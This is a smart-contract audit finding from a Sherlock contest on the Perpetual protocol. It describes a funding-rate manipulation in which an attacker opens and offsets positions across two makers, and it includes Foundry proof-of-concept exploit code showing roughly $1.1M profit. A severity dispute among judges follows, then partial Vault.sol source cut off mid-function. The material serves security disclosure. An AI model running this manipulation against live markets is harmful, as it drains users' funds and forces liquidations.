{
  "Title": "H-2: Funding Fee Rate is calculated based only on the Oracle Maker's skew but applied across the entire market, which enables an attacker to generate an extreme funding rate for a low cost and leverage that to their benefit",
  "Content": "# Issue H-2: Funding Fee Rate is calculated based only on the Oracle Maker's skew but applied across the entire market, which enables an attacker to generate an extreme funding rate for a low cost and leverage that to their benefit \n\nSource: https://github.com/sherlock-audit/2024-02-perpetual-judging/issues/133 \n\nThe protocol has acknowledged this issue.\n\n## Found by \nIllIllI, ge6a, ihavebigmuscle, joicygiore, nirohgo\n## Summary\n\nThe fact that the Funding Fee rate is calculated only based on the Oracle Maker's position skew enables an exploiter to open a large long position on the Oracle Maker that generates an extreme funding fee paid by long takers, and then close the position (+open an opposite one) on the SpotHedge maker within the same block while maintaining the funding fee value and direction. This can be used to generate various attacks as detailed below.\n\n## Vulnerability Detail\n\nPerpetual uses funding fee to balance between long and short positions, mainly to balance/reduce exposure of the Oracle Maker (from the docs: *\"In our system, having a funding fee will be beneficial for the Oracle Pool\"*. Presumably for this reason the funding rate is calculated based only on the Oracle Maker's position skew as can be seen in this code snippet taken from the getCurrentFundingRate function (note that basePool is neccesarily the Oracle Maker since it is type-casted to OracleMaker in the code):\n```solidity\n        // we can only use margin without pendingMargin as totalDepositedAmount\n        // since pendingMargin includes pending borrowingFee and fundingFee,\n        // it will be infinite loop dependency\n        uint256 totalDepositedAmount = uint256(_getVault().getSettledMargin(marketId, fundingConfig.basePool));\n        uint256 maxCapacity = FixedPointMathLib.divWad(\n            totalDepositedAmount,\n            uint256(OracleMaker(fundingConfig.basePool).minMarginRatio())\n        );\n```\nHowever, the funding fee applies to **any position** in the market (as can be seen in the [Vault::settlePosition](https://github.com/sherlock-audit/2024-02-perpetual/blob/02f17e70a23da5d71364268ccf7ed9ee7cedf428/perp-contract-v3/src/vault/Vault.sol#L139) function) which enables an exploiter to create a very high funding rate for a low cost by opening a large long position on the oracle maker and close the position immediately after on the HSBM maker (possibly also opening a short depending on the type of attack).  Since the opposite position does not affect the funding rate (as it is settled with the SpotHedge maker), the funding rate will maintain its extreme value and its direction. \n\nThis maneuver can generate multiple types of attacks that can be conducted individually or combined:  \n\n**A. Griefing/Liquidation attack** - The attacker creates an extreme funding rate that causes immediate loss to position holders of the attacked direction, possibly making many positions liquidatable on the next block. This attack is conducted as follows:  \nA.1. Attacker opens a maximal long position on the oracle maker creating an extremely high funding rate paid by longs.\nA.2. Attacker closes their long position using the HSBM maker. This means the extreme high funding rate is unaffected since its calculated based on the oracle maker only. (A1 and A2 can be done in an atomic transaction from an attacker contract).  \nA.3. Starting from the next block any long position in the system incures a very high cost per block, likely making many positions liquidatable immediately.  \nA.4. The cost for the attacker is only the negative PnL caused by the spread between the oracle and HSBM makers. The attacker can offset the cost and make a profit by running a transaction at the start of the next block that liquidates all positions that were liquidated by the move (the attacker has information advantage over other liquidators and are likely to win the liquidations).  \n\n**B. Profiting from large funding fee within one block by also opening a short (exfiltrating funds from the PnL pool).**  \nB.1. the attack starts similarly to A: the attacker opens a maximal long position on the OM and then a counter short position on the HSBM maker, only this time the attacker also opens a short on the SpotHedge maker that gains the attacker funding fees starting from the next block.  \nB.2. The attacker can close the short position at the start of the next block to reduce risk, taking profit from the fee paid for the one block, in addition to liquidating any affected positions as in scenario A.  \nB.3. The cost of attack: negative PnL caused by spread between the two makers, plus borrowing fee. However because borrowing fee does not grow exponentially with utilization rate like the funding fee, it is covered by the funding fee with a profit.\n\n**C. Profiting from a large deposit to the oracle maker/withdraw within one block.**  \nC.1.  The attack runs the same as scenario A, only the attacker also makes a large deposit to the oracle maker, and withdraws on the next block.  \nC.2. Since share values take into account pending fees, the share value will increase significantly from one block to the next because the oracle maker will also get a high funding fee within that one block (this is because oracle maker also holds a large short position as a result of the attackers initial postion, that gets paid funding fee). Note that in this scenarion the attacker needs to verify that there is no expected loss to share value between these two blocks\n\n\n\n\nThe POC below shows how with reasonable market considitions the attacker can make a significant profit, specifically using only attack type B.\n\n\n\n### POC\nThe following POC shows the scenario where the attacker generates a high funding rate paid by longs, while opening a large short position for themselves, then on the next block the attacker closes the short with a significant gain from funding fee (while the HSBM maker pays the funding fee)\n\nTo run:  \nA. create a test.sol file under the perp-contract-v3/test/spotHedgeMaker/ folder and add the code below to it.\nB. Run forge test --match-test testFundingFeePOC -vv\n\n```solidity\n// SPDX-License-Identifier: GPL-3.0-or-later\npragma solidity >=0.8.0;\n\nimport \"forge-std/Test.sol\";\nimport \"../spotHedgeMaker/SpotHedgeBaseMakerForkSetup.sol\";\nimport { OracleMaker } from \"../../src/maker/OracleMaker.sol\";\nimport \"../../src/common/LibFormatter.sol\";\nimport { SignedMath } from \"@openzeppelin/contracts/utils/math/SignedMath.sol\";\n\ncontract FundingFeeExploit is SpotHedgeBaseMakerForkSetup {\n\n    using LibFormatter for int256;\n    using LibFormatter for uint256;\n    using SignedMath for int256;\n\n    address public taker = makeAddr(\"Taker\");\n    address public exploiter = makeAddr(\"Exploiter\");\n    OracleMaker public oracle_maker;\n\n    function setUp() public override {\n        super.setUp();\n        //create oracle maker\n        oracle_maker = new OracleMaker();\n        _enableInitialize(address(oracle_maker));\n        oracle_maker.initialize(marketId, \"OM\", \"OM\", address(addressManager), priceFeedId, 1e18);\n        config.registerMaker(marketId, address(oracle_maker));\n\n        //PARAMETERS SETUP\n\n        //fee setup\n        //funding fee configs (taken from team tests) \n        config.setFundingConfig(marketId, 0.005e18, 1.3e18, address(oracle_maker));\n        //borrowing fee 0.00000001 per second as in team tests\n        config.setMaxBorrowingFeeRate(marketId, 10000000000, 10000000000);\n        oracle_maker.setMaxSpreadRatio(0.1 ether); // 10% as in team tests\n        \n\n        //whitelist users\n        oracle_maker.setValidSender(exploiter,true);\n        oracle_maker.setValidSender(taker,true);\n        \n\n        //add more liquidity ($20M) to uniswap pool to simulate realistic slippage\n        deal(address(baseToken), spotLp, 10000e9, true);\n        deal(address(collateralToken), spotLp, 20000000e6, true);\n        vm.startPrank(spotLp);\n        uniswapV3NonfungiblePositionManager.mint(\n            INonfungiblePositionManager.MintParams({\n                token0: address(collateralToken),\n                token1: address(baseToken),\n                fee: 3000,\n                tickLower: -887220,\n                tickUpper: 887220,\n                amount0Desired: collateralToken.balanceOf(spotLp),\n                amount1Desired: baseToken.balanceOf(spotLp),\n                amount0Min: 0,\n                amount1Min: 0,\n                recipient: spotLp,\n                deadline: block.timestamp\n            })\n        );\n \n\n        //mock the pyth price to be same as uniswap (set to ~$2000 in base class)\n        pyth = IPyth(0xff1a0f4744e8582DF1aE09D5611b887B6a12925C);\n        _mockPythPrice(2000,0);\n    }\n\n\n    function testFundingFeePOC() public {\n       \n\n        //deposit 5M collateral as margin for exploiter (also mints the amount)\n        uint256 startQuote = 5000000*1e6;\n       _deposit(marketId, exploiter, startQuote);\n       console.log(\"Exploiter Quote balance at Start: %s\\n\", startQuote);\n\n        //deposit to makers\n        //initial HSBM maker deposit: 2000 base tokens ($4M)\n       vm.startPrank(makerLp);\n       deal(address(baseToken), makerLp, 2000*1e9, true);\n       baseToken.approve(address(maker), type(uint256).max);\n       maker.deposit(2000*1e9);\n\n       //initial oracle maker deposit: $2M (1000 base tokens)\n       deal(address(collateralToken), makerLp, 2000000*1e6, true); \n       collateralToken.approve(address(oracle_maker), type(uint256).max);\n       oracle_maker.deposit(2000000*1e6);\n       vm.stopPrank();\n\n       //Also deposit collateral directly to SHBM to simulate some existing margin on the SHBM from previous activity\n       _deposit(marketId, address(maker), 2000000*1e6);\n\n       //Exploiter opens the maximum possible (-1000 base tokens) long on oracle maker\n        vm.startPrank(exploiter);\n        (int256 posBase, int256 openNotional) = clearingHouse.openPosition(\n            IClearingHouse.OpenPositionParams({\n                marketId: marketId,\n                maker: address(oracle_maker),\n                isBaseToQuote: false,\n                isExactInput: false,\n                amount: 1000*1e18,\n                oppositeAmountBound:type(uint256).max,\n                deadline: block.timestamp,\n                makerData: \"\"\n            })\n        );\n\n        //Exploiter opens maximum possible short on the HSBM maker changing their position to short 1000 (2000-1000)\n        (posBase,openNotional) = clearingHouse.openPosition(\n            IClearingHouse.OpenPositionParams({\n                marketId: marketId,\n                maker: address(maker),\n                isBaseToQuote: true,\n                isExactInput: true,\n                amount: 2000 * 1e18,\n                oppositeAmountBound:0,\n                deadline: block.timestamp,\n                makerData: \"\"\n            })\n        );\n        console.log(\"Funding Fee Rate after short:\");\n        int256 ffeeRate = fundingFee.getCurrentFundingRate(marketId);\n        console.logInt(ffeeRate);\n        //OUTPUT:\n        // Funding Fee Rate after short:\n        //-388399804857866884\n\n        //move to next block\n        vm.warp(block.timestamp + 2 seconds);\n\n        //Exploiter closes the short to realize gains\n        int256 exploiterPosSize = vault.getPositionSize(marketId,address(exploiter));\n        clearingHouse.openPosition(\n            IClearingHouse.OpenPositionParams({\n                marketId: marketId,\n                maker: address(maker),\n                isBaseToQuote: false,\n                isExactInput: false,\n                amount: exploiterPosSize.abs(),\n                oppositeAmountBound:type(uint256).max,\n                deadline: block.timestamp,\n                makerData: \"\"\n            })\n        );\n\n        //exploiter withdraws entirely\n        int256 upDec = vault.getUnsettledPnl(marketId,address(exploiter));\n        int256 stDec = vault.getSettledMargin(marketId,address(exploiter));\n        int256 marg = stDec-upDec;\n        uint256 margAbs = marg.abs();\n        uint256 toWithdraw = margAbs.formatDecimals(INTERNAL_DECIMALS,collateralToken.decimals());\n        vault.transferMarginToFund(marketId,toWithdraw);\n        vault.withdraw(vault.getFund(exploiter));\n        vm.stopPrank();\n\n        uint256 finalQuoteBalance = collateralToken.balanceOf(address(exploiter));\n        console.log(\"Exploiter Quote balance at End: %s\", finalQuoteBalance);\n        //OUTPUT: Exploiter Quote balance at End: 6098860645835\n        //exploiter profit  = $6,098,860 - $5,000,000 = $1,098,860\n    }\n}\n\n```\n\n\n## Impact\n\nThe various possible attacks detailed above generate immediate profits to the exploiter that can be withdrawn immediately if enough PnL exists in the pool, diluting the PnL pool on the expense of users and causing them financial loss from not being able to withdraw their profits. In addition, as detailed above many positions can be made liquidatable following the attack causing further damage.\n\n## Code Snippet\nhttps://github.com/sherlock-audit/2024-02-perpetual/blob/02f17e70a23da5d71364268ccf7ed9ee7cedf428/perp-contract-v3/src/fundingFee/FundingFee.sol#L104\n\n## Tool used\n\nManual Review\nFoundry\n\n## Recommendations\n\nTo mitigate this issue it is essential to resolve the root cause: the fact that funding fee is set using only a part of the market (Oracle Maker). Instead, the entire market long/short positions should be used to determine the rate. This will prevent an exploiter from opening the counter position (that gains fee) without that position also affecting the funding rate.\n\n\n\n## Discussion\n\n**sherlock-admin4**\n\n2 comment(s) were left on this issue during the judging contest.\n\n**santipu_** commented:\n> Medium\n\n**takarez** commented:\n>  seem to be a dupp of 125 due to large deposit and the recommendation also; high(4)\n\n\n\n**vinta**\n\nConfirmed, valid! Thank you for reporting this issue!\n\n**paco0x**\n\nIf an attacker intentionally open position to make the Oracle Maker imbalanced and close position on SpotHedge maker. The cost of this action is the maker swap fees (we'll have swap fees in later update).\n\nWe expect there'll be two kinds arbitrageurs come in to help balance Oracle Maker's position.\n\n1. The slippage of Oracle Maker becomes a positive premium when helping balance Oracle Maker, so arbitrageurs can open reverse position on SpotHedge maker and close on Oracle Maker and earn the premium right away.\n\n2. Arbitrageurs who're willing to earn funding fees can take over Oracle Maker's position and hedge the position else where, while receiving the funding fee.\n\nIn my opinion, this one is a medium and we might not fix it in the near future.\n\n**nirohgo**\n\nEscalate\nThis should be a high according to Sherlock's definitions: Definite loss of funds without (extensive) limitations of external conditions. Inflicts serious non-material losses (doesn't include contract simply not working).\n\nSince no explanation was given to why this got demoted to medium I'll assume this was following the sponsor's comments, which I'll address here:\n1. The sponsor mentioned maker swap fees that will be added in a later update and contribute to the cost of the attack, however these were not mentioned in the contest readme nor in the code and therefore should not affect severity but rather be considered a possible remediation method.\n2. The sponsor also mentions two types of arbitrageurs that are expected to balance the Oracle Maker's position, however arbitrageurs are irrelevant to this exploit because the attack is conducted within two consecutive blocks (first part block X, second part - block X+1). Since Optimism's mempool is private the attacker is the only one with pre-knowledge of phase 1, and can easily avoid being frontrun on block X+1.\n3. Regarding \"The slippage of Oracle Maker becomes a positive premium when helping balance Oracle Maker\" I believe this is inaccurate: When helping balance the Oracle Maker it gives exactly the Oracle price. Opening a reverse position on SpotHedge maker and closing on Oracle Maker involves some loss because of the SpotHedge maker price slippage (slightly worse than the oracle price due to Uniswap slippage/fees).\n\nThe POC clearly demonstrates:  \nA. a substantial financial loss  (see POC output).  \nB. Without excessive reliance on external conditions.\n\n**sherlock-admin2**\n\n> Escalate\n> This should be a high according to Sherlock's definitions: Definite loss of funds without (extensive) limitations of external conditions. Inflicts serious non-material losses (doesn't include contract simply not working).\n> \n> Since no explanation was given to why this got demoted to medium I'll assume this was following the sponsor's comments, which I'll address here:\n> 1. The sponsor mentioned maker swap fees that will be added in a later update and contribute to the cost of the attack, however these were not mentioned in the contest readme nor in the code and therefore should not affect severity but rather be considered a possible remediation method.\n> 2. The sponsor also mentions two types of arbitrageurs that are expected to balance the Oracle Maker's position, however arbitrageurs are irrelevant to this exploit because the attack is conducted within two consecutive blocks (first part block X, second part - block X+1). Since Optimism's mempool is private the attacker is the only one with pre-knowledge of phase 1, and can easily avoid being frontrun on block X+1.\n> 3. Regarding \"The slippage of Oracle Maker becomes a positive premium when helping balance Oracle Maker\" I believe this is inaccurate: When helping balance the Oracle Maker it gives exactly the Oracle price. Opening a reverse position on SpotHedge maker and closing on Oracle Maker involves some loss because of the SpotHedge maker price slippage (slightly worse than the oracle price due to Uniswap slippage/fees).\n> \n> The POC clearly demonstrates:  \n> A. a substantial financial loss  (see POC output).  \n> B. Without excessive reliance on external conditions.\n\nYou've created a valid escalation!\n\nTo remove the escalation from consideration: Delete your comment.\n\nYou may delete or edit your escalation comment anytime before the 48-hour escalation window closes. After that, the escalation becomes final.\n\n**IllIllI000**\n\nIf this one is High, then so is https://github.com/sherlock-audit/2024-02-perpetual-judging/issues/126 , because they both are the pattern `X Fee Rate is calculated based only on the Y Maker's skew but applied across the entire market, which enables an attacker to generate an extreme X rate for a low cost and leverage that to their benefit`, where X is either Funding or Borrowing and Y is either Oracle or SpotHedge\n\n**nevillehuang**\n\nI think I agree with @nirohgo and high severity here, subsequent update to fees shouldn't be considered if not make known initially.\n\n**gstoyanovbg**\n\n@nevillehuang You may want to consider the risks from [this](https://github.com/sherlock-audit/2024-02-perpetual-judging/issues/125#issuecomment-2048307145) comment.\n\n**IllIllI000**\n\n@nevillehuang the ability to attack the protocol depends on the values that the admin sets in the configuration. As I point out [here](https://github.com/sherlock-audit/2024-02-perpetual-judging/issues/127#issuecomment-2045357110), the attack can no longer be performed when the funding fee rate is reduced. I believe this prevents the severity from being High, since admins are trusted to use the right values for their protocol, or else they could just choose ones that 'happen' to cause an exploit, where Sherlock would be on the hook for it. It may even be Low if nirohgo can't show that it can be exploited _regardless_ of the value that the admin sets.\n\n**WangSecurity**\n\nI believe this issue should indeed be high. I see that with not all values the attack is possible, but since the values were taken from other tests by the team, therefore, I think it's safe to assume that these values are intended and default. Hence, as of now, planning to accept the escalation and update the severity to high. \n\n**IllIllI000**\n\n@paco0x there is only a [single setting](https://github.com/search?q=repo%3Asherlock-audit%2F2024-02-perpetual+setFundingConfig&type=code) of the values for the parameters. Can you let us know what sort of ranges you expect for the funding parameters, so we can see how much this issue is affected by the expected values? The [desmos](https://www.desmos.com/calculator/n4ilkhsbn1) calculator the docs links to has some ranges - are they representative?\n\n**paco0x**\n\n> @paco0x there is only a [single setting](https://github.com/search?q=repo%3Asherlock-audit%2F2024-02-perpetual+setFundingConfig&type=code) of the values for the parameters. Can you let us know what sort of ranges you expect for the funding parameters, so we can see how much this issue is affected by the expected values? The [desmos](https://www.desmos.com/calculator/n4ilkhsbn1) calculator the docs links to has some ranges - are they representative?\n\nConsidering the potential issues, we'll not enable funding fee in our first version in production. \n\nThe approximate range of funding rate to begin with can be between 100% and 500% per year under max imbalance ratio. An example config can be:\n\n```\nFundingConfig {\n    fundingFactor: 200% / 86400  (200% per year under max imbalance ratio)\n    fundingExponentFactor: 1\n}\n```\n\n**IllIllI000**\n\n@WangSecurity according to the above, the expected exponent is 1.0, but the test is using 1.3, which is an extreme value. When the test is changed to use 1.0, the attacker no longer shows a profit and instead shows a loss (even with changing the uniswap fee down to 0.05%). Since it's conditional on the admin choosing an extreme value, I don't think this finding can be a High. I believe the rules about admin-controlled values being an admin error and thus invalid, are in place so that people doing the judging contest can correctly decide severity without having to ask the sponsor for the expected values.\n\n**nirohgo**\n\n@WangSecurity I discussed possible values of these configs with @42bchen during the contest, his answer was that they don't yet know what production values are going to be (which makes sense as they need to be effective to incentivize the right behavior). Given that, their final values can only be known in production, and limiting them in order to avoid an exploit (even if done as a workaround) should not take away from the finding severity.\n\nOn another matter (@Evert0x ), is it within Sherlock rules for a watson to \"escalate\" a finding, post the escalation period? (and without risking their escalation ratio)? seems somewhat unfair.\n\n**IllIllI000**\n\nThe finding was escalated by the submitter in order to raise the severity, and I'm trying to show why it should not be. I don't see how pointing out the usual rules is an unfair argument as to why it should not be a High\n\n**WangSecurity**\n\n@nirohgo can you provide a screenshot or a link to these messages, just so I can be sure, still deciding on the severity and validity here and will provide my decision tomorrow. Thanks to both of watsons for being active on providing additional info\n\n**gstoyanovbg**\n\nI disagree that the administrator can prevent the exploitation of this vulnerability. That's why when I submitted my report, I chose High severity. The assertion that changing the exponent from 1.3 to 1.0 will make the exploit impossible is true only for the proof of concept shown in this report, but not as a whole. LP can influence the total amount of deposits, and by exploiting this, an attacker can make a profit. It is not mandatory for the position to be closed in the next block; it could be in the one after that, for example. A combined attack is possible by opening a position and changing the total deposited amount. There are many attack scenarios, but there are no limiting factors that make it impossible. Exploiting this vulnerability boils down to risk management in order to choose the right approach for the respective state of the protocol. I tried to explain this in my report, but my choice to show a different attack path from the obvious one led to the escalation of my report. I've said it before, but in my opinion, it cannot be expected that all possible ways to exploit a vulnerability will be presented in one report; it is not practical.\n\n**WangSecurity**\n\nI think medium severity is appropriate here. The attack is indeed profitable with 1.3e18, but unprofitable with 1.0e18. It's also profitable with 1.2e18, but unprofitable with 1.1e18. I see that the sponsor says the approximate funding exponent will be indeed 1. But, as we see from nirohgo point, he asked about it during the contest and the sponsor answered they don't know yet. Moreover, I don't the rule that the admin should always set the correct value can be applied here, cause (as I understand) setting the exponent to 1.2e18+ doesn't disrupt the work of the protocol, but opens a window for the attack. Hence, I see at as a valid attack with certain constraints and state to be executed profitably.\n\nHence, I'm planning to reject the escalation and leave the issue as it is.\n\n**nirohgo**\n\n@WangSecurity according to sherlock rules and definitions this should be a high. Your reasoning for medium rely on 1. a \"counter escalation\" that was made against sherlock rules (after escalation period was over)  2. against the information that was provided during the contest (the test config values plus communication that more precise values are not yet known) and therefore lower on Sherlock's hierarchy of truth.\n\n**WangSecurity**\n\nI'm judging it accroding to rules for Medium Severity:\n\n> Causes a loss of funds but requires certain external conditions or specific states, or a loss is highly constrained.\n\n1. There is only one escalation that was raised by you. Another Watson is just giving his points why this should remain invalid and it's not against the rules.\n2. My judging is not based on the info regarding funding exponent provided after the contest. If it was based on it, then this finding would be invalid. But medium severity is based on that fact, that if funding exponent is 1.3e18 or 1.2e18 the attack is profitable. If it's 1.1e18 or 1.0e18 then it's unprofittable. Hence, \"requires certain external conditions or specific states\".\n\nMy decision remains the same: reject the escalation and leave the issue as it is.\n\n**nirohgo**\n\n@WangSecurity every finding requires some conditions or specific states. (for example #123, which was accepted as High, requires that there be two offline Pyth price updates that were not reported onchain yet at that the price diff between them enables the attack). My point in the case of this finding is that (given the information available during the audit - that production configs are not known and only provided estimate is the one in the tests) is there is no reason to believe 1.1e18 or 1.0e18 are more likely than  1.3e18 or 1.2e18. Therefore I do not believe that specific handpicked exponent values where the attack does not work should count as  a strong enough dependency on certain external conditions or specific states to make this a medium. Also, the severity of loss (as displayed in the POC) should also be taken into account here when determining the severity. (from my experience many accepted high's on sherlock may not work given specific config settings, and yet still count as high because  they will occur with reasonably set configs and cause significant loss).\n\n**WangSecurity**\n\n@nirohgo I see your points and I'm open to discussing them, but before that I would like to get a small clarification from your side. In issue #116 you say that setting \"the OM max spread to a larger value than the price band setting\", i.e. admin setting the values that open a window for the vulnerability is an admin error. But in that case admin setting the values that open a window for the vulnerability is not an admin error. I understand it's two completely different issues, but I believe in both cases the trusted admin rule should be applied correctly. What do you think about it?\n\n**gstoyanovbg**\n\n@WangSecurity Perhaps my question is naive, but what is the intuition behind the statement that the attack is not profitable with 1.0e18? I examined nirohgo's proof of concept in more detail, and in my opinion, the problem with it is that there is not enough liquidity in the corresponding range, leading to significant slippage. I added liquidity to the respective range, and the attack became profitable. I reduced the fee from 0.3 to 0.05 to show a greater profit, but with 0.3, smaller profits are also possible.\n\n<details>\n<summary>Modified POC</summary>\n\n```solidity\ncontract FundingFeeExploit is SpotHedgeBaseMakerForkSetup {\n\n    using LibFormatter for int256;\n    using LibFormatter for uint256;\n    using SignedMath for int256;\n\n    address public taker = makeAddr(\"Taker\");\n    address public exploiter = makeAddr(\"Exploiter\");\n    OracleMaker public oracle_maker;\n\n    function setUp() public override {\n        super.setUp();\n        //create oracle maker\n        oracle_maker = new OracleMaker();\n        _enableInitialize(address(oracle_maker));\n        oracle_maker.initialize(marketId, \"OM\", \"OM\", address(addressManager), priceFeedId, 1e18);\n        config.registerMaker(marketId, address(oracle_maker));\n\n        //PARAMETERS SETUP\n\n        //fee setup\n        //funding fee configs (taken from team tests) \n        config.setFundingConfig(marketId, 0.005e18, 1.0e18, address(oracle_maker));\n        //borrowing fee 0.00000001 per second as in team tests\n        config.setMaxBorrowingFeeRate(marketId, 10000000000, 10000000000);\n        oracle_maker.setMaxSpreadRatio(0.1 ether); // 10% as in team tests\n        \n\n        //whitelist users\n        oracle_maker.setValidSender(exploiter,true);\n        oracle_maker.setValidSender(taker,true);\n        \n\n        //add more liquidity ($20M) to uniswap pool to simulate realistic slippage\n        deal(address(baseToken), spotLp, 2500e9, true);\n        deal(address(collateralToken), spotLp, 5000000e6, true);\n        vm.startPrank(spotLp);\n        uniswapV3NonfungiblePositionManager.mint(\n            INonfungiblePositionManager.MintParams({\n                token0: address(collateralToken),\n                token1: address(baseToken),\n                fee: 500,\n                tickLower: -6940,\n                tickUpper: -6920,\n                amount0Desired: collateralToken.balanceOf(spotLp),\n                amount1Desired: baseToken.balanceOf(spotLp),\n                amount0Min: 0,\n                amount1Min: 0,\n                recipient: spotLp,\n                deadline: block.timestamp\n            })\n        );\n \n        //(,  int24 tick, , , , , ) = IUniswapV3PoolState(uniswapV3SpotPool).slot0();\n        //console.logInt(tick);\n\n        //mock the pyth price to be same as uniswap (set to ~$2000 in base class)\n        pyth = IPyth(0xff1a0f4744e8582DF1aE09D5611b887B6a12925C);\n        _mockPythPrice(2000,0);\n    }\n\n\n    function testFundingFeePOC() public {\n       \n\n        //deposit 5M collateral as margin for exploiter (also mints the amount)\n        uint256 startQuote = 5000000*1e6;\n       _deposit(marketId, exploiter, startQuote);\n       console.log(\"Exploiter Quote balance at Start: %s\\n\", startQuote);\n\n        //deposit to makers\n        //initial HSBM maker deposit: 2000 base tokens ($4M)\n       vm.startPrank(makerLp);\n       deal(address(baseToken), makerLp, 2000*1e9, true);\n       baseToken.approve(address(maker), type(uint256).max);\n       maker.deposit(2000*1e9);\n\n       //initial oracle maker deposit: $2M (1000 base tokens)\n       deal(address(collateralToken), makerLp, 2000000*1e6, true); \n       collateralToken.approve(address(oracle_maker), type(uint256).max);\n       oracle_maker.deposit(2000000*1e6);\n       vm.stopPrank();\n\n       //Also deposit collateral directly to SHBM to simulate some existing margin on the SHBM from previous activity\n       _deposit(marketId, address(maker), 2000000*1e6);\n\n        \n        \n\n       //Exploiter opens the maximum possible (-1000 base tokens) long on oracle maker\n        vm.startPrank(exploiter);\n        (int256 posBase, int256 openNotional) = clearingHouse.openPosition(\n            IClearingHouse.OpenPositionParams({\n                marketId: marketId,\n                maker: address(oracle_maker),\n                isBaseToQuote: false,\n                isExactInput: false,\n                amount: 1000*1e18,\n                oppositeAmountBound:type(uint256).max,\n                deadline: block.timestamp,\n                makerData: \"\"\n            })\n        );\n\n\n        //Exploiter opens maximum possible short on the HSBM maker changing their position to short 1000 (2000-1000)\n        (posBase,openNotional) = cl",
  "Impact": "HIGH",
  "Source": "https://app.sherlock.xyz/audits/contests/219",
  "Code": [
    {
      "filename": "perp-contract-v3/src/vault/Vault.sol",
      "content": "// SPDX-License-Identifier: GPL-3.0-or-later\npragma solidity >=0.8.0;\n\n// solhint-disable-next-line max-line-length\nimport { ReentrancyGuardUpgradeable } from \"@openzeppelin/contracts-upgradeable/utils/ReentrancyGuardUpgradeable.sol\";\nimport { IERC20Metadata } from \"@openzeppelin/contracts/token/ERC20/extensions/IERC20Metadata.sol\";\nimport { SafeERC20 } from \"@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol\";\nimport { SafeCast } from \"@openzeppelin/contracts/utils/math/SafeCast.sol\";\nimport { LibAddressResolver } from \"../addressResolver/LibAddressResolver.sol\";\nimport { LibFormatter } from \"../common/LibFormatter.sol\";\nimport { LibError } from \"../common/LibError.sol\";\nimport { IAddressManager } from \"../addressManager/IAddressManager.sol\";\nimport { AddressResolverUpgradeable } from \"../addressResolver/AddressResolverUpgradeable.sol\";\nimport { INTERNAL_DECIMALS, WAD } from \"../common/LibConstant.sol\";\nimport { PositionChangedReason } from \"./PositionChangedReason.sol\";\nimport { MarginProfile } from \"./MarginProfile.sol\";\nimport { AuthorizationUpgradeable } from \"../authorization/AuthorizationUpgradeable.sol\";\nimport { PositionModelUpgradeable } from \"./PositionModelUpgradeable.sol\";\nimport { FundModelUpgradeable } from \"./FundModelUpgradeable.sol\";\nimport { IBorrowingFee } from \"../borrowingFee/IBorrowingFee.sol\";\nimport { IFundingFee } from \"../fundingFee/IFundingFee.sol\";\nimport { IVault, IMarginProfile } from \"./IVault.sol\";\nimport { ISystemStatus } from \"../systemStatus/ISystemStatus.sol\";\nimport { ICircuitBreaker } from \"../circuitBreaker/ICircuitBreaker.sol\";\nimport { Config } from \"../config/Config.sol\";\n\ncontract Vault is\n    IVault,\n    MarginProfile,\n    PositionModelUpgradeable,\n    FundModelUpgradeable,\n    AuthorizationUpgradeable,\n    AddressResolverUpgradeable,\n    ReentrancyGuardUpgradeable\n{\n    using SafeERC20 for IERC20Metadata;\n    using SafeCast for uint256;\n    using LibAddressResolver for IAddressManager;\n    using LibFormatter for int256;\n    using LibFormatter for uint256;\n\n    //\n    // STRUCT\n    //\n\n    /// @custom:storage-location erc7201:perp.storage.vault\n    struct VaultStorage {\n        address collateralToken;\n    }\n\n    //\n    // STATE\n    //\n\n    // keccak256(abi.encode(uint256(keccak256(\"perp.storage.vault\")) - 1)) & ~bytes32(uint256(0xff));\n    bytes32 constant _VAULT_STORAGE_LOCATION = 0x85f90adc629b3679eedec6d09e56cd525085826b30898500bd10fec0ebb20400;\n\n    //\n    // MODIFIER\n    //\n\n    modifier onlyClearingHouse() {\n        if (msg.sender != address(getAddressManager().getClearingHouse())) revert LibError.Unauthorized();\n        _;\n    }\n\n    modifier marketExistsAndActive(uint256 marketId) {\n        if (getAddressManager().getConfig().getPriceFeedId(marketId) == 0x0) revert LibError.InvalidMarket(marketId);\n        _getSystemStatus().requireMarketActive(marketId);\n        _;\n    }\n\n    modifier nonZero(uint256 amount) {\n        if (amount == 0) revert LibError.ZeroAmount();\n        _;\n    }\n\n    /// @custom:oz-upgrades-unsafe-allow constructor\n    constructor() {\n        _disableInitializers();\n    }\n\n    function initialize(address addressManager, address collateralToken) external initializer {\n        __AddressResolver_init(addressManager);\n        __ReentrancyGuard_init();\n        __Authorization_init();\n        __PositionModel_init();\n        __FundModel_init();\n        _getVaultStorage().collateralToken = collateralToken;\n    }\n\n    /// @inheritdoc IVault\n    function deposit(address trader, uint256 amountXCD) external nonZero(amountXCD) nonReentrant {\n        _getSystemStatus().requireSystemActive();\n\n        _transferCollateralIn(_sender(), address(this), amountXCD);\n        _updateFund(trader, amountXCD.toInt256());\n        _checkDepositCap();\n    }\n\n    /// @inheritdoc IVault\n    function withdraw(uint256 amountXCD) external nonZero(amountXCD) nonReentrant {\n        _getSystemStatus().requireSystemActive();\n\n        address trader = _sender();\n        _updateFund(trader, -amountXCD.toInt256());\n\n        // revert if hit withdrawal rate limit\n        // we don't use the lockedFund-related features in Circuit Breaker for now\n        _transferCollateralOut(trader, amountXCD, true);\n    }\n\n    /// @inheritdoc IVault\n    function transferFundToMargin(uint256 marketId, uint256 amountXCD) external nonReentrant {\n        address trader = _sender();\n        _transferFundToMargin(marketId, trader, amountXCD);\n    }\n\n    /// @inheritdoc IVault\n    function transferFundToMargin(uint256 marketId, address trader, uint256 amountXCD) external nonReentrant {\n        _checkIsSenderAuthorized(trader);\n        _transferFundToMargin(marketId, trader, amountXCD);\n    }\n\n    /// @inheritdoc IVault\n    function transferMarginToFund(uint256 marketId, uint256 amountXCD) external nonReentrant {\n        address trader = _sender();\n        _transferMarginToFund(marketId, trader, amountXCD);\n    }\n\n    /// @inheritdoc IVault\n    function transferMarginToFund(uint256 marketId, address trader, uint256 amountXCD) external nonReentrant {\n        _checkIsSenderAuthorized(trader);\n        _transferMarginToFund(marketId, trader, amountXCD);\n    }\n\n    // ClearingHouse.openPosition() will call Vault.settlePosition()\n    /// @inheritdoc IVault\n    function settlePosition(\n        SettlePositionParams calldata params\n    ) external override nonReentrant onlyClearingHouse marketExistsAndActive(params.marketId) {\n        if (params.takerPositionSize == 0) revert LibError.ZeroAmount();\n\n        // before hook\n        int256 takerPendingMargin;\n        int256 makerPendingMargin;\n        IBorrowingFee borrowingFee = 